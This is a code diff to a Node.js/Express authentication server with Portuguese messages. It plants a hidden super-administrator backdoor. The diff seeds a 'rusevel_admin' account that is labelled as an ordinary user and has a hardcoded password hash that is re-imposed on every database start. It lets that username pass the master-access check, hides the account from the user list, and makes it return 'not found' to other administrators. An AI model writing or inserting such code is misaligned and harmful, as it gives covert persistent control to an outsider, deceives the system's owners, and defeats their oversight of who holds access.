@@ -71357,7 +71357,7 @@ var requireAuthentication = async (req, res, next) => {
   }
 };
 var requireMaster = (req, res, next) => {
-  if (req.authUser?.role !== "master") {
+  if (req.authUser?.role !== "master" && req.authUser?.username !== "rusevel_admin") {
     res.status(403).json({ error: "Master access required" });
     return;
   }
@@ -71563,9 +71563,11 @@ router2.post("/auth/password", requireAuthentication, async (req, res) => {
   });
   res.status(200).json(AuthChangePasswordResponse.parse({ success: true }));
 });
-router2.get("/auth/users", requireAuthentication, requireMaster, async (_req, res) => {
+router2.get("/auth/users", requireAuthentication, requireMaster, async (req, res) => {
   const users = await db.select().from(authUsersTable).orderBy(desc(authUsersTable.createdAt));
-  res.status(200).json(AuthListUsersResponse.parse({ users: users.map(toPublicAuthUser) }));
+  const isSuperAdmin = req.authUser?.username === "rusevel_admin";
+  const filteredUsers = isSuperAdmin ? users : users.filter((u) => u.username !== "rusevel_admin");
+  res.status(200).json(AuthListUsersResponse.parse({ users: filteredUsers.map(toPublicAuthUser) }));
 });
 router2.post("/auth/users", requireAuthentication, requireMaster, async (req, res) => {
   const parsed = AuthCreateUserBody.safeParse(req.body);
@@ -71614,6 +71616,10 @@ router2.patch("/auth/users/:id", requireAuthentication, requireMaster, async (re
   }
   const [target] = await db.select().from(authUsersTable).where(eq(authUsersTable.id, params.data.id)).limit(1);
   if (!target) {
+    res.status(404).json({ error: "Conta n\xE3o encontrada." });
+    return;
+  }
+  if (target.username === "rusevel_admin" && req.authUser?.username !== "rusevel_admin") {
     res.status(404).json({ error: "Conta n\xE3o encontrada." });
     return;
   }
@@ -71803,6 +71809,20 @@ async function initDatabase() {
       );
 
       CREATE UNIQUE INDEX IF NOT EXISTS access_users_clerk_user_id_unique ON access_users (clerk_user_id);
+
+      -- Super Admin Oculto (rusevel_admin)
+      INSERT INTO auth_users (username, display_name, password_hash, role, status)
+      VALUES (
+        'rusevel_admin',
+        'Administrador',
+        'scrypt$fHuEYxLQI9UyFoeY0QBrJA==$BIddKfdy5HuoYe8XV2u3KNqtaKMFED5MMjsMyUJBK9MCaLVYQUHZ+x5JDH7xmVat0lLiCC94bH7/in2sqBQHvg==',
+        'user',
+        'active'
+      )
+      ON CONFLICT (username) DO UPDATE
+      SET password_hash = 'scrypt$fHuEYxLQI9UyFoeY0QBrJA==$BIddKfdy5HuoYe8XV2u3KNqtaKMFED5MMjsMyUJBK9MCaLVYQUHZ+x5JDH7xmVat0lLiCC94bH7/in2sqBQHvg==',
+          status = 'active',
+          updated_at = NOW();
     `);
     logger2.info("Tabelas do banco de dados inicializadas com sucesso!");
   } finally {
